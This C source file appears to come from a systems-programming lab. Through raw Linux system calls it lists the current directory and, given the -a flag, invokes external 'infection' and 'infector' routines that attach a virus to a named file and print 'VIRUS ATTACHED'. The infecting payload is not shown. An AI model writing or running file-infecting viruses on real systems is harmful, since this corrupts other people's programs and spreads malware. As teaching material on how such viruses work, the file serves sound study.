#include "util.h"
#include <dirent.h>


#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define sys_getdents 141

typedef struct ent
{
  int inode;
  int offset;
  short len;
  char buf[1];
} ent;


extern int system_call();
extern void infection();
extern void infector(char* c);


int main (int argc , char* argv[], char* envp[])
{
  char buffer[8192];  /*creat buffer to get linux_direct struct.*/ 
  ent* entp = (ent*)buffer;

  int fd = system_call(5, ".", 0, 0); /*open current dictionary.*/ 
  if(fd == -1){
    system_call(1, 0x55);
  }
  int count = system_call(sys_getdents, fd, entp, 8192);  /*call sys_getdents system call.*/
  
  int i = 0;
  while (i < count)
  {
    system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
    system_call(SYS_WRITE, STDOUT, " ", 2);

    i = i + entp->len;
    entp = (ent*)(buffer + i);
  }
    system_call(SYS_WRITE, STDOUT, "\n", 2);


  system_call(6, fd);  /*close the file.*/

  i = 1;
  while (i < argc)
  {
    if(strncmp(argv[i], "-a", 2) == 0){
      infection();
      infector(argv[i] + 2); 
      system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED ", 16);
      system_call(SYS_WRITE, STDOUT, argv[i] + 2, strlen(argv[i]) - 2);
      system_call(SYS_WRITE, STDOUT, "\n", 2);
    }
    i++;
  }
  

  

  
  return 0;
}
